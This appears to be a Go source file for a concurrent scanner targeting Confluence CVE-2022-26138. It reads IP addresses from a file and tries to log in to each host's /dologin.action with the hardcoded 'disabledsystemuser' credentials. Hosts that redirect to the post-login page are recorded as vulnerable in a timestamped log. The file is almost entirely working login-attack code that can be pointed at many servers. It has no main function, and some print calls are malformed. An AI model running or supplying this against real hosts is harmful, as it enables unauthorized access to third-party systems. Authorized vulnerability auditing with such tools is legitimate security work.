package main

import (
	"bufio"
	"fmt"
	"github.com/gookit/color"
	"github.com/imroc/req/v3"
	"io"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"time"
)

var wg sync.WaitGroup

var stamp bool

var absPath string

type Confluence struct {
}

func init() {
	files, _ := os.Executable()
	path, _ := filepath.Split(files)
	absPath = path + time.Now().Format("20060102150405") + ".log"
}

func (c *Confluence) r0(ip string, client *req.Client) (bool, error) {
	payload := "os_username=disabledsystemuser&os_password=disabled1system1user6708&login=Log+in&os_destination=%2Fvulnerable.action"
	resp, err := c.payload(ip, payload, client)
	if err != nil {
		return false, err
	}
	if resp.Response.Request.Response != nil {
		if resp.Response.Request.Response.StatusCode == 302 && strings.Contains(resp.Response.Request.Response.Header.Get("location"), "/vulnerable.action") {
			return true, nil
		}
	}
	return false, nil
}

func (c *Confluence) payload(ip, payload string, client *req.Client) (*req.Response, error) {
	resp, err := client.R().
		SetHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36").
		SetHeader("Content-Type", "application/x-www-form-urlencoded").
		SetBody(payload).
		Post("http://" + ip + "/dologin.action")
	if err != nil {
		return nil, err
	}
	return resp, nil

}

func (c *Confluence) singleScan(ip string) {
	if stamp {
		defer wg.Done()
	}

	client := req.C()
	r0, err := c.r0(ip, client)
	if err != nil {
		color.FgRed.Printf("[ERROR]:%v\n", err)
		return
	}
	if r0 {
		color.FgGreen.Printf("[INFO]:[%s] Confluence CVE-2022-26138 Existent\n", ip)
		c.scanLogs(ip)
	} else {
		color.FgGray.Printf("[INFO]:[%s] Confluence CVE-2022-26138 Non-existent\n", ip)
	}
}

func (c *Confluence) batchScan(path string) {
	stamp = true
	begin := time.Now()
	color.FgGray.Println("[INFO]:Scan...")

	f, err := os.Open(path)
	if err != nil {
		color.FgRed.Println("[ERROR]:%v\n", err)
		return
	}
	defer f.Close()

	r := bufio.NewReader(f)

	for {
		ip, err := r.ReadString('\n')
		ip = strings.TrimSpace(ip)
		if err != nil && err != io.EOF {
			color.FgRed.Println("[ERROR]:%v\n", err)
			return
		}
		if ip != "" {
			wg.Add(1)
			go c.singleScan(ip)
		}
		if err == io.EOF {
			break
		}

	}
	wg.Wait()
	timeDif := time.Now().Sub(begin)
	color.FgGray.Println("[INFO]:Take", timeDif)
}

func (c *Confluence) scanLogs(ip string) {
	f, err := os.OpenFile(absPath, os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0666)
	if err != nil {
		fmt.Println(err)
		return
	}
	defer f.Close()

	f.WriteString(fmt.Sprintf("[%s] [INFO]:[%s] Confluence CVE-2022-26138 Existent\n", time.Now().Format("2006-01-02 15:04:05"), ip))
}
